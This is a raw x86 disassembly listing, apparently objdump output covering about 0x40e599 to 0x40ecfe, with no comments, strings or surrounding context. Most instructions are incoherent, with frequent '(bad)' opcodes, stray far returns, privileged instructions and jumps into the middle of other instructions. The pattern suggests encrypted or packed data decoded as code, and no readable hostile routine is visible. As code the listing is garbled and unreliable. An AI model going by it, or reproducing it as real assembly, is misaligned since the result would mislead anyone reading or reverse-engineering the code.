  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
